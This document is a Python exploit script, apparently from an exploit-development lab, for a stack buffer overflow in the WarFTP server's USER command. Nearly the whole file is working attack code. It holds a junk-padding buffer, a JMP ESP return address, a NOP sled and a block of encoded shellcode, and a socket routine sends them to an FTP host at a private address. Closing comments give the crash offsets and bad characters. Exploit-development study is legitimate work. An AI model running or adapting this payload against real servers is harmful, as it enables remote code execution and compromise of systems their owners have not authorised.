# WarFTP Buffer Overflow Exploit

import socket

# Buffer Overflow occurs due to use of `strcpy` function
# in FTP `USER` command.

# `USER` command is followed by a text string that 
# identifies the user.


# Exploit construct:
# USER[space]{username}\r\n

host = "192.168.1.20"
port = 21

junk_data = bytearray(b"A" * 485)
return_address = bytearray(b"\x53\x93\x42\x7e")
nop_num_bytes = 100
nop_sled = bytearray(b"\x90" * nop_num_bytes)

shellcode = (
    b"\xbb\xc8\xea\xb6\xab\xdb\xd9\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
    b"\x49\x83\xea\xfc\x31\x5a\x0e\x03\x92\xe4\x54\x5e\xfb\x12\x03"
    b"\x78\x8f\xc0\xc0\x4a\xbd\xbb\x5e\x9c\x88\xd8\x2b\xaf\x3a\xaa"
    b"\x5a\x5c\xb1\xda\xbe\xd7\x83\x2a\x34\x99\x2b\xa0\x7c\x5e\x64"
    b"\xae\xf5\x6d\x23\xcf\x24\x6e\x32\xaf\x4d\xfd\x90\x14\xd9\xbb"
    b"\xe4\xdf\x89\x6b\x6c\xe1\xdb\xe7\xc6\xf9\x90\xa2\xf6\xf8\x4d"
    b"\xb1\xc2\xb3\x1a\x02\xa1\x45\xf3\x5a\x4a\x74\xcb\x61\x18\xf3"
    b"\x0b\xed\x67\x3d\x44\x03\x66\x7a\xb0\xe8\x53\xf8\x63\x39\xd6"
    b"\xe1\xe7\x63\x3c\xe3\x1c\xf5\xb7\xef\xa9\x71\x9d\xf3\x2c\x6d"
    b"\xaa\x08\xa4\x70\x44\x99\xfe\x56\x88\xfb\x3d\x24\xb8\xd2\x15"
    b"\xc0\x5d\xad\x54\xbb\x13\xe0\x56\xd0\x79\x15\xf9\xd7\x82\x1a"
    b"\x8f\x6d\x78\x5e\xee\xb5\x62\xd3\x88\x5a\x46\x46\x7f\xec\x79"
    b"\x99\x80\x78\xc0\x6e\x17\x17\xa6\x4e\xa6\x8f\x05\xbd\x06\x34"
    b"\x01\xb4\x25\xd1\xa3\x06\x11\x91\x1f\x43\xaf\x2b\x79\xdd\x50"
    b"\x7e\x81\x6b\x6c\xd1\x32\xc3\xd3\x9f\xf8\x93\x08\x04\x52\x74"
    b"\x6f\xbb\xad\x7b\xf8\x1b\x71\xa4\xd9\xf3\x13\xdd\x7c\x25\xbb"
    b"\x5a\x10\x4a\x5f\x54\x35\x1c\xc3\xb2\xc1\x94\x18\xd2\xf0\xfe"
    b"\xfe\x03\x9b\x91\x96\x2a\x2f\x06\x04\xd4\xef\x84\xa0\x48\x95"
    b"\x4c\x10\xfd\x3b\xad\x20\x8a\xab\x8d\xa2\x11\x49\xa6\x4a\xbb"
    b"\xe7\x53\xe2\x62\x67\xe9\xd2\xa5\xbe\x99\x5e\xe2\x5d\x13\xbf"
    b"\xdb\x8f\x49\x0f\x4f\x61\xdc\x90\xbf\xb0\x20\x3e\xbf\xe6\xa8" 
)

buffer = junk_data + return_address + nop_sled + shellcode

def send_exploit(buffer, host, port):
    prefix = bytearray("USER ".encode("ascii"))
    suffix = bytearray("\r\n".encode("ascii"))

    exploit_input = prefix + buffer + suffix

    csocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    csocket.connect((host, port))

    print(f"Sever data: {csocket.recv(128)}")

    print("[+] Sending exploit data...")

    csocket.send(exploit_input)

    print(f"Sever data: {csocket.recv(128)}")

    print("[+] Exploit input sent.")



send_exploit(buffer, host, port)


# Comments:
# EIP after crash: 32714131
# ESP after crash: 00AFFD48 -> 71413471

# EIP Offset: 485
# ESP Offset: 493

# ESP points to part of exploit input and
# can be used to execute shellcode

# Address of `JMP ESP` instruction: 7E429353

# Bad characters:
# 0x00, 0x0a, 0x0d, 0x40

